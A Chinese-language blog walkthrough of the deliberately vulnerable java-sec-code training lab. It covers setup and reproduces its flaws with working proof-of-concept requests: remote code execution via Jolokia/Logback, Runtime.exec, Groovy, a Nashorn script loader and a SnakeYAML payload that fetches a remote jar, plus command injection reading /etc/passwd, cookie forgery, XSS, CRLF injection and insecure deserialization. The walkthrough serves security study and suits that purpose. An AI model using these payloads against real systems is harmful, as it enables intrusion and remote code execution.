---
title: java-sec-code 靶场题解
date: 2025-07-28T21:00:00+08:00
tags:
  - "java 靶场"
categories:
  - "Java"
description: java-sec-code 靶场题解
showToc: true
draft: false
tocOpen: true
---
# java-sec-code 靶场

# 一、靶场环境

源码地址：

https://github.com/JoyChou93/java-sec-code

搭建环境：

IDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，

​	数据库：小皮面板自带的MySQL，导入sql文件

![20250722121837762](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924734.png)

![20250722121922614](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924866.png)

​		修改数据库密码

![20250722121952382](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080924471.png)

​		默认端口为8080，如果被占用，在 application.properties 中写入 `server.port=8081`

![20250722122032495](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925668.png)

之后启动 Maven install

![20250722122150263](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080925205.png)

运行 Application.java

![20250722122307068](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926472.png)

访问 127.0.0.1:8081

![20250722122339704](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926105.png)



搭建成功

![20250722122412538](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926235.png)



以下是一些小的改动：

参考文章：https://www.freebuf.com/articles/web/289863.html

> 
>
> 因为项目作者选择的工作环境为linux操作系统，而我本人选择的工作环境为windows操作系统，所以为了部分功能运行成功需要修改几处源码，首先修改CommandInject.java文件下的源码，将sh执行命令替换为cmd命令，还有修改源码中一些其它的linux操作系统上独有的命令。



1. src/main/java/org/joychou/controller/CommandInject.java

```java 
//String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
String[] cmdList = new String[]{"cmd.exe", "/c", "dir " + filepath};
```

![20250722122752916](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926915.png)



2. src/main/resources/templates/index.html

```html
<!--    <a th:href="@{/codeinject?filepath=/tmp;cat /etc/passwd}">CmdInject</a>&nbsp;&nbsp;-->
<a th:href="@{/codeinject?filepath=.%26ipconfig}">CmdInject</a>
   
<!--    <a th:href="@{/path_traversal/vul?filepath=../../../../../etc/passwd}">PathTraversal</a>&nbsp;&nbsp;-->
<a th:href="@{/path_traversal/vul?filepath=D:/test.txt}">PathTraversal</a>
    
<!--    <a th:href="@{/ssrf/urlConnection/vuln?url=file:///etc/passwd}">SSRF</a>&nbsp;&nbsp;-->
<a th:href="@{/ssrf/urlConnection/vuln?url=file:///D:/test.txt}">SSRF</a>
```

![20250722123350854](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080926719.png)





# 二、漏洞复现

- [Actuators to RCE](https://github.com/JoyChou93/java-sec-code/wiki/Actuators-to-RCE)
- [CORS](https://github.com/JoyChou93/java-sec-code/wiki/CORS)
- [CSRF](https://github.com/JoyChou93/java-sec-code/wiki/CSRF)
- [Deserialize](https://github.com/JoyChou93/java-sec-code/wiki/Deserialize)
- [Fastjson](https://github.com/JoyChou93/java-sec-code/wiki/Fastjson)
- [Java RMI](https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI)
- [JSONP](https://github.com/JoyChou93/java-sec-code/wiki/JSONP)
- [POI-OOXML XXE](https://github.com/JoyChou93/java-sec-code/wiki/Poi-ooxml-XXE)
- [SQLI](https://github.com/JoyChou93/java-sec-code/wiki/SQL-Inject)
- [SSRF](https://github.com/JoyChou93/java-sec-code/wiki/SSRF)
- [SSTI](https://github.com/JoyChou93/java-sec-code/wiki/SSTI)
- [URL whitelist Bypass](https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass)
- [XXE](https://github.com/JoyChou93/java-sec-code/wiki/XXE)
- [JWT](https://github.com/JoyChou93/java-sec-code/wiki/JWT)  
- [Others](https://github.com/JoyChou93/java-sec-code/wiki/others)

### Logback.xml

src/main/resources/logback-online.xml

```xml
<configuration>  <!-- logback 配置文件标签 -->
    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">   <!-- 控制台输出标签 -->
        <withJansi>true</withJansi>  <!-- Jansi 是一个 Java 库，用来支持彩色日志输出  -->
        <encoder>  <!-- 输出格式标签 -->
            <pattern>[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n</pattern>  <!-- 输出格式 -->
        </encoder>
    </appender>
    <root level="info">  <!-- 根标签 -->
        <appender-ref ref="STDOUT" />  <!-- 引用控制台输出标签 -->
    </root>
    <jmxConfigurator/>  <!-- 暴露 Logback 的运行时配置能力（开启 JMX 管理功能）  -->
</configuration>
```

**漏洞产生原因：**

`   <jmxConfigurator/>`

作用：暴露 Logback 的运行时配置能力（开启 JMX 管理功能）

这个配置会注册一个 JMX MBean （可以远程管理的 Java 对象 ，“遥控器”），它允许用户通过 JMX 控制台、Jolokia （Jolokia 是一个用来访问远程 JMX MBeans 的方法，Jolokia 通过 HTTP 访问 JMX）等远程管理工具调用 Logback 的方法

如果系统部署中 暴露了 Jolokia 的 /jolokia 接口，攻击者可以远程调用 Logback 的 reloadByURL 方法，加载恶意配置文件，进而发起 JNDI 注入 ➜ 远程代码执行（RCE）



**漏洞利用：**

```
http://localhost:8081/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8888!/xxx.xml
```



- `/jolokia/exec/`：Jolokia 的 exec 调用路径

- `ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator`：Logback 中添加 `<jmxConfigurator/>` 注册 JMX MBean 后的默认名称

- `/reloadByURL/`：调用的 JMX 方法，即 `reloadByURL(URL configFile)`，运行后重新加载 Logback 配置文件

- `http:!/!/127.0.0.1:8888!/xxx.xml`：注意 `!/!/` 是 URL 编码中对 `/` 和 `:` 的绕过手法，最后解析成：

  ```
  http://127.0.0.1:8888/xxx.xml
  ```



### Rce.java

src/main/java/org/joychou/controller/Rce.java

#### 1./runtime/exec

```java 
public class Rce {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {//接收 cmd 参数
        Runtime run = Runtime.getRuntime();//获取当前 JVM 的 RunTime 对象，通过它可以调用 exec 命令
        StringBuilder sb = new StringBuilder();//接收输出结果

        try {
            Process p = run.exec(cmd);//执行 cmd 命令
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
```

没有进行过滤，产生了rce 漏洞

**漏洞利用：**

POC：/rce/runtime/exec?cmd=calc.exe

可以弹出计算机

![20250722141657147](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927152.png)



POC：/rce/runtime/exec?cmd=whoami



![20250722141728262](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927609.png)





#### 2./ProcessBuilder

```java
@GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {//接收输入的 cmd

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};//将 cmd 直接拼接到 shell 环境
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();//触发命令执行
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

```

这一漏洞需要在Linux环境中复现



#### 3./jscmd

```java 
@GetMapping("/jscmd")  // 定义GET请求端点
public void jsEngine(String jsurl) throws Exception {  // 接收jsurl参数
    // 获取JavaScript引擎（Nashorn）
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");    
    // 获取当前引擎的作用域绑定
    Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);    
    // 构造加载远程JS的命令
    String cmd = String.format("load(\"%s\")", jsurl);    
    // 执行加载命令
    engine.eval(cmd, bindings);
}
```

- 直接使用用户输入的`jsurl`构造`load()`命令
- **无任何安全过滤**

**漏洞利用：**

因为是基于Java的Nashorn JavaScript引擎，接受一个**外部JS文件URL**（`jsurl`），然后通过`load()`函数去加载执行远程的JS代码，如果远程JS包含恶意代码（比如调用Java的`Runtime.exec`执行系统命令），就会造成远程命令执行（RCE）漏洞。



先编写一个恶意的JS文件

```js
// zz.js
var a = mainOutput();
function mainOutput() {
    // Windows打开计算器命令
    var cmd = "calc.exe";

    // 执行系统命令
    var Runtime = Java.type("java.lang.Runtime");
    Runtime.getRuntime().exec(cmd);
}

```

![20250722150342733](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927399.png)



放入C盘

![20250722150411441](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927712.png)



用Python自带的简易HTTP服务器快速启动

```cmd
cd C:\malicious
python -m http.server 8000
```

![20250722150542190](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927851.png)



现在本地就有了一个HTTP服务器，远程JS脚本的URL就是：

```
http://localhost:8000/zz.js
```



POC：

```
http://127.0.0.1:8081/rce/jscmd?jsurl=http://localhost:8000/zz.js
```

成功弹出计算器

![20250722150709404](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927894.png)



HTTP访问日志：

![20250722150740046](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928094.png)





#### 4./vuln/yarm



```Java
@GetMapping("/vuln/yarm")
public void yarm(String content) {
    //使用默认构造方法创建一个 SnakeYAML 的解析器。这个构造器会使用默认的 Constructor，允许加载 Java 对象，存在安全风险。
    Yaml y = new Yaml();
    //这里把传入的 content 作为 YAML 输入进行解析，如果内容里构造了特殊的 Java 对象，就可能会被反序列化并执行代码，形成 RCE
    y.load(content);
}

@GetMapping("/sec/yarm")
public void secYarm(String content) {
    Yaml y = new Yaml(new SafeConstructor());
    y.load(content);
}
```

 **YAML 反序列化漏洞** ,利用 SnakeYAML 默认构造器（反序列化）+ JDK 类加载机制，达到远程代码执行（RCE） 的攻击。

攻击核心点在于：

> **构造 ScriptEngineManager 并传入一个远程 URLClassLoader，从而触发恶意类加载或脚本执行。**
>
> SnakeYaml反序列化漏洞研究:https://www.cnblogs.com/LittleHann/p/17828948.html





这是源码中作者给出的一个poc

```
http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]

```





yaml-payload.jar:https://github.com/artsploit/yaml-payload

下载好后开始打包为 jar：

```
javac src/artsploit/AwesomeScriptEngineFactory.java 

jar -cvf yaml-payload.jar -C src/ .
```

![20250722153817282](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928242.png)

![20250722153829103](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928271.png)



将打包好的文件  yaml-payload.jar 放入服务器文件夹，开启HTTP

![20250722154012661](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929506.png)



触发漏洞：

```
http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22]]]]
```



![20250722155011777](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928486.png)



![20250722155022447](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929891.png)







#### 5.groovy

```java 
 @GetMapping("groovy")
    public void groovyshell(String content) {
        //GroovyShell 是 Groovy 提供的脚本解释器，可以在 Java 程序中动态执行 Groovy 代码
        GroovyShell groovyShell = new GroovyShell();
        //将用户传入的脚本内容作为 Groovy 代码,立即执行
        groovyShell.evaluate(content);
    }
```



POC:

```
rce/groovy?content="calc".execute()
```



![20250722155651468](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929076.png)





## 命令注入-Cmd Inject



源码位置：src/main/java/org/joychou/controller/CommandInject.java

### 1./codeinject

```Java
@GetMapping("/codeinject")
    public String codeInject(String filepath) throws IOException {//GET 请求，接收 filepath 参数
        //String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
        String[] cmdList = new String[]{"cmd.exe", "/c", "dir " + filepath};//启动 cmd ，/c 执行后关闭终端，dir filepath 列出指定路径下的文件和目录；此处直接拼接了用户输入，存在 RCE 漏洞。
        ProcessBuilder builder = new ProcessBuilder(cmdList);//使用上面构建的命令数组创建进程
        builder.redirectErrorStream(true);//将标准错误流（stderr）合并到标准输出流（stdout），方便统一读取
        Process process = builder.start();//启动进程，执行命令
        return WebUtils.convertStreamToString(process.getInputStream());//获取命令执行后的标准输出流
    }
```



```Java
public ProcessBuilder(String... command) {
        this.command = new ArrayList<>(command.length);
        for (String arg : command)
            this.command.add(arg);
    }
    
 public ProcessBuilder redirectErrorStream(boolean redirectErrorStream) {
        this.redirectErrorStream = redirectErrorStream;
        return this;
    }
```



**漏洞利用：**

```
http://127.0.0.1:8081/codeinject?filepath=.%26calc.exe
http://127.0.0.1:8081/codeinject?filepath=.%26ipconfig
http://127.0.0.1:8081/codeinject?filepath=.%26whoami
http://127.0.0.1:8081/codeinject?filepath=%7Cwhoami
```

- 注意将符号进行 url 编码
  - & - .%26 - 拼接cmd命令
  - | - %7C - 执行多条命令

![20250723130014199](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929661.png)



![20250723130045224](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929041.png)



![20250723130103166](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929093.png)

![20250723130116070](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930759.png)



Linux：

```
http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd
```



### 2./codeinject/host

```java
@GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }

```

注入参数为http请求头中的host参数，将host参数修改为 `payload：localhost&ipconfig`，执行命令



BUG: Codeinject的host部分由于pom.xml更新了tomcat 版本导致打不通:

https://github.com/JoyChou93/java-sec-code/issues/78

### 3./codeinject/sec

```java 
@GetMapping("/codeinject/sec")
public String codeInjectSec(String filepath) throws IOException {
    String filterFilePath = SecurityUtil.cmdFilter(filepath);//调用了自定义的安全类
    if (null == filterFilePath) {//如果 cmdFilter 方法返回 null ，进行拦截
        return "Bad boy. I got u.";
    }
    String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};//Linux 下的 shell 命令
    ProcessBuilder builder = new ProcessBuilder(cmdList);
    builder.redirectErrorStream(true);
    Process process = builder.start();
    return WebUtils.convertStreamToString(process.getInputStream());
}
```

```java
public class SecurityUtil {

    private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
    private final static Logger logger = LoggerFactory.getLogger(SecurityUtil.class);

	...
	public static String cmdFilter(String input) {
        	if (!FILTER_PATTERN.matcher(input).matches()) {
            	return null;
        	}

        	return input;
    	}
    ...
    
}
```

`"^[a-zA-Z0-9_/\\.-]+$"`:

- `^` 和 `$`：表示整个字符串必须从头到尾都符合中间的规则。

- `[a-zA-Z0-9_/\\.-]+`：

  - `a-zA-Z0-9`：大小写字母和数字

  - `_`：允许下划线

  - `/`：允许正斜杠（路径分隔符）
  - `.`：允许点号（如隐藏文件、扩展名）

  - `-`：允许减号

可以过滤的威胁：

- `;`, `&`, `|`, `$`, `\`（除路径分隔符）, `*`, 空格、换行、引号等

## cookies越权

src/main/java/org/joychou/controller/Cookies.java

```Java
package org.joychou.controller;

import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;

import org.joychou.util.WebUtils;
import org.springframework.web.bind.annotation.RestController;

import static org.springframework.web.util.WebUtils.getCookie;


/**
 * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。
 */
@RestController
@RequestMapping("/cookie")
public class Cookies {

    //表示 Cookie 中用于表示用户昵称的键
    private static String NICK = "nick";

    @GetMapping(value = "/vuln01")
    public String vuln01(HttpServletRequest req) {
        //调用 getCookieValueByName 方法获取 cookie 中的 nick 值
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return "Cookie nick: " + nick;
    }
    /*
    public class WebUtils {
    	...
    	public static String getCookieValueByName(HttpServletRequest request, String cookieName) {
        	Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName);
        	return cookie == null ? null : cookie.getValue();
    	}
    	...
    }
 */


    @GetMapping(value = "/vuln02")
    public String vuln02(HttpServletRequest req) {
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) {
			//调用 getCookie 方法获取 cookie 中的 nick 值
            nick = getCookie(req, NICK).getValue();  // key code
        }

        return "Cookie nick: " + nick;
    }
    /*
    public class WebUtils {
    	...
    	public static Cookie getCookie(HttpServletRequest request, String name) {
        	Assert.notNull(request, "Request must not be null");
        	Cookie[] cookies = request.getCookies();
        	if (cookies != null) {
            	for(Cookie cookie : cookies) {
                	if (name.equals(cookie.getName())) {
                    	return cookie;
                	}
            	}
        	}
        	return null;
    	}
    	...
    }
    	
    */
    


    @GetMapping(value = "/vuln03")
    public String vuln03(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            //遍历所有 cookie ，找 name 为 nick
            for (Cookie cookie : cookies) {
                // key code. Equals can also be equalsIgnoreCase.
                //equals() 是大小写敏感
                if (NICK.equals(cookie.getName())) {
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }


    @GetMapping(value = "/vuln04")
    public String vuln04(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                //使用 equalsIgnoreCase()，支持不区分大小写匹配 Cookie 名称。
                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }


    @GetMapping(value = "/vuln05")
    //使用 Spring 注解 @CookieValue("nick") 自动注入名为 nick 的 cookie 值。
    public String vuln05(@CookieValue("nick") String nick) {
        return "Cookie nick: " + nick;
    }


    @GetMapping(value = "/vuln06")
    //和 vuln05 仅语法不同，功能完全一样。
    public String vuln06(@CookieValue(value = "nick") String nick) {
        return "Cookie nick: " + nick;
    }

}

```



**漏洞利用：**

vuln01

http://127.0.0.1:8081/cookie/vuln01

抓包改 cookie，

```
Cookie: nick=admin;
```

![20250723141110105](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930981.png)

vuln02

同 vuln01

![20250723141320799](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931435.png)

vuln03

因为大小写敏感，所以要写准确的 nick

![20250723141512271](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931594.png)

如果不是全小写，就会被拦截

![20250723141532175](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931715.png)

vuln04

不区分大小写，



vuln05

```javascript
// 伪造一个 nick=admin 的 Cookie
document.cookie = "nick=admin; path=/";

// 发送请求，获取接口返回
fetch("http://127.0.0.1:8081/cookie/vuln05").then(res => res.text()).then(text => console.log(text));
```

![20250723142428662](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png)

vuln06



![20250723142510453](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931560.png)





```javascript
document.cookie = "nick=<script>alert(1)</script>; path=/";
fetch("http://127.0.0.1:8081/cookie/vuln06").then(res => res.text()).then(text => console.log(text));
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080931254.png)



## Cors

>跨域资源共享 CORS 详解
>
>https://www.ruanyifeng.com/blog/2016/04/cors.html
>
>#### 原理与工作流程
>
>CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。
>
>CORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。
>
>相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。
>
>CORS具体工作流程可分为三步，
>
>1. 资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源；
>2. 浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许；
>
>#### CORS与CSRF的区别
>
>一般有CORS漏洞的地方都有CSRF。
>
>CSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。
>
>浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。
>
>相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。
>
>不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。
>
>由于代码限制不严格，会导致跨域请求伪造可以结合xss，csrf进行攻击





src/main/java/org/joychou/controller/Cors.java



```java 
@RestController
@RequestMapping("/cors")
public class Cors {

    private static String info = "{\"name\": \"JoyChou\", \"phone\": \"18200001111\"}";

    @GetMapping("/vuln/origin")
    public String vuls1(HttpServletRequest request, HttpServletResponse response) {
        String origin = request.getHeader("origin");
        //后端无验证，直接将前端传来的 origin 反射回去，没有判断这个 origin 是否合法
        response.setHeader("Access-Control-Allow-Origin", origin); // set origin from header
        //可以在跨域请求中携带 Cookie / Session / Authorization 这些身份凭证
        response.setHeader("Access-Control-Allow-Credentials", "true");  // allow cookie
        return info;
    }

    @GetMapping("/vuln/setHeader")
    public String vuls2(HttpServletResponse response) {
        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
        response.setHeader("Access-Control-Allow-Origin", "*");
        return info;
    }
```



`response.setHeader("Access-Control-Allow-Origin", origin); //任意网站都可以访问本网站`

`response.setHeader("Access-Control-Allow-Credentials", "true");  //允许这些任意网站带上用户的 Cookie 来访问本网站`

这俩个头一起用就导致攻击者可以构造任意恶意网页，从任意网站带上 Cookie 访问本网站，获取到用户数据，造成数据泄露。



**漏洞利用：**

攻击者从 `evil.com` 发起跨域请求（使用前端脚本携带 Cookie 向另一个子域发请求），诱导已经在 `http://127.0.0.1:8081` 网站上登录的用户访问  `evil.com` ，而由于服务端设置了`response.setHeader("Access-Control-Allow-Origin", origin);response.setHeader("Access-Control-Allow-Credentials", "true");`，所以当攻击者访问 `http://127.0.0.1:8081/cors/vuln/origin` 页面，服务端无过滤就会响应，使得攻击者拿到敏感信息。



cors复现: https://blog.csdn.net/wanmiqi/article/details/119573354





## CRLFInjection

>初识HTTP响应拆分攻击（CRLF Injection）
>
>https://www.anquanke.com/post/id/240014
>
>CRLF 指的是**回车符**（CR，ASCII 13，\r，%0d）和**换行符**（LF，ASCII 10，\n，%0a）的简称（\r\n）。在《[HTTP | HTTP报文](http://mp.weixin.qq.com/s?__biz=MzU2NzY5MjAwNQ==&mid=2247483836&idx=1&sn=1b1ccd6f196c87b7f3bf4b1c585d9d9e&chksm=fc981e36cbef972043707782aaa968ba94a960adba855a35afc5e896edeb2160d513ab1667cf&scene=21#wechat_redirect)》一文中，我们可以了解到HTTP报文的结构：HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。
>
>在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。
>
>在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。

src/main/java/org/joychou/controller/CRLFInjection.java

```java 
@Controller
@RequestMapping("/crlf")
public class CRLFInjection {

    @RequestMapping("/safecode")
    //表示该方法直接将返回结果写入 HTTP 响应体中
    @ResponseBody
    //接收 HttpServletRequest request: 客户端发来的请求对象，HttpServletResponse response: 用于构造响应返回给客户端。
    public void crlf(HttpServletRequest request, HttpServletResponse response) {
        //将用户传入的 test1 作为值添加到响应头中
        response.addHeader("test1", request.getParameter("test1"));
        //设置 test2 响应头为请求参数 test2 的值。如果该 header 已存在，将被覆盖
        response.setHeader("test2", request.getParameter("test2"));
        //获取参数 test3 的值，赋给 author
        String author = request.getParameter("test3");
        //创建一个新的 Cookie，名为 test3，值为 author
        Cookie cookie = new Cookie("test3", author);
        //将该 Cookie 添加到响应头中
        response.addCookie(cookie);
    }
}
```



**漏洞利用：**

构造POC：

```
/crlf/safecode?test1=abc%0D%0ASet-Cookie:%20evil=1
```

正常来讲应该看到一个新的标头

```
Set-Cookie: evil=1
```

我这里没有复现成功，可能是因为 tomcat 版本高自动过滤了 `\r\n` 



![20250723161852286](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933198.png)









## CSRF

[CSRF漏洞原理攻击与防御（非常细）-CSDN博客](https://blog.csdn.net/qq_43378996/article/details/123910614)



![20250724095137238](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080933314.jpeg)



所以要被CSRF攻击，必须同时满足两个条件：

- 登录受信任网站A，并在本地生成Cookie。
- 在不登出A的情况下，访问危险网站B。

```Java      
@Controller
@RequestMapping("/csrf")
public class CSRF {

    @GetMapping("/")
    public String index() {
        return "form";
    }

    @PostMapping("/post")
    @ResponseBody
    public String post() {
        return "CSRF passed.";
    }
}
```



## Deserialize



```Java
package org.joychou.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.joychou.config.Constants;
import org.joychou.security.AntObjectInputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.util.Base64;

import static org.springframework.web.util.WebUtils.getCookie;

/**
 * Deserialize RCE using Commons-Collections gadget.
 *
 * @author JoyChou @2018-06-14
 */
@RestController
@RequestMapping("/deserialize")
public class Deserialize {

    protected final Logger logger = LoggerFactory.getLogger(this.getClass());

    /**
     * java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64 <br>
     * <a href="http://localhost:8080/deserialize/rememberMe/vuln">http://localhost:8080/deserialize/rememberMe/vuln</a>
     */
    @RequestMapping("/rememberMe/vuln")
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {
		
        //从请求中读取 rememberMe cookie
        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }

        //将 rememberMe cookie 中 Base64 编码的数据进行解码
        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        //将 byte[] 包装成字节输入流
        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        //构造 ObjectInputStream 对象，从流中读取对象，
        ObjectInputStream in = new ObjectInputStream(bytes);
        //读取字节流中的对象，进行反序列化，若 cookie 中包含恶意类，将被执行
        in.readObject();
        in.close();

        return "Are u ok?";
    }

    /**
     * Check deserialize class using black list. <br>
     * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true',but you must ensure that your application does not de-serialize objects from untrusted sources.<br>
     * <a href="http://localhost:8080/deserialize/rememberMe/security">http://localhost:8080/deserialize/rememberMe/security</a>
     */
    //黑名单过滤
    @RequestMapping("/rememberMe/security")
    public String rememberMeBlackClassCheck(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);

        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }
        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

